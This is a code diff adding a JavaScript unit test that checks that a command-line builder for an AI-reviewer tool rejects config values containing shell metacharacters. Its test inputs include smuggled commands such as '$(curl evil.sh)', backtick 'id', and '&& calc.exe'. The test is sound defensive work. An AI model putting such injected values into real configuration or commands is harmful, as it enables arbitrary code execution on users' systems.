@@ -68,6 +68,32 @@ test("buildCommandLine: 空串参数被引号保护，特殊字符参数被包�
   assert.equal(buildCommandLine(BASE_CONFIG, { ADV_REVIEWER_CMD: "node fake.mjs" }), "node fake.mjs");
 });
 
+test("安全净化（Bugbot #ccf429d8）: 配置值带 shell 元字符一律拒用，不让其上命令行", () => {
+  // reviewModel 注入命令替换 → --model 整个被跳过
+  const l1 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "$(curl evil.sh)" }, {});
+  assert.ok(!l1.includes("curl"), `命令替换不得出现: ${l1}`);
+  assert.ok(!l1.includes("--model"));
+  // 反引号注入 → 拒用
+  const l2 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "opus`id`" }, {});
+  assert.ok(!l2.includes("`") && !l2.includes("--model"));
+  // reviewerCommand 拼接 && → 整个命令被拒，回退默认 claude
+  const l3 = buildCommandLine({ ...BASE_CONFIG, reviewerCommand: "claude && calc.exe" }, {});
+  assert.ok(!l3.includes("calc"), `拼接命令不得出现: ${l3}`);
+  assert.ok(l3.startsWith("claude "));
+  // cmd 变量展开 %VAR% → 拒用
+  const l4 = buildCommandLine({ ...BASE_CONFIG, reviewerArgs: ["--flag", "%PATH%"] }, {});
+  assert.ok(!l4.includes("%PATH%"));
+  assert.ok(l4.includes("--flag"), "合法的同批参数不受影响");
+  // 分号/管道 → 拒用
+  const l5 = buildCommandLine({ ...BASE_CONFIG, reviewerModel: undefined, reviewerArgs: ["a;b|c"] }, {});
+  assert.ok(!l5.includes(";") && !l5.includes("|"));
+  // 合法值（含空格路径、斜杠模型名、点版本号）不受净化影响
+  const ok1 = buildCommandLine({ ...BASE_CONFIG, reviewModel: "anthropic/claude-opus-4.5" }, {});
+  assert.ok(ok1.includes("--model anthropic/claude-opus-4.5"));
+  const ok2 = buildCommandLine({ ...BASE_CONFIG, reviewerArgs: ["--fallback-model", "glm-5.3-flash"] }, {});
+  assert.ok(ok2.includes("glm-5.3-flash"));
+});
+
 test("reviewerArgs: 模型注入与额外参数追加", () => {
   const args = reviewerArgs({ ...BASE_CONFIG, reviewModel: "opus", reviewerArgs: ["--fallback-model", "sonnet"] });
   const i = args.indexOf("--model");
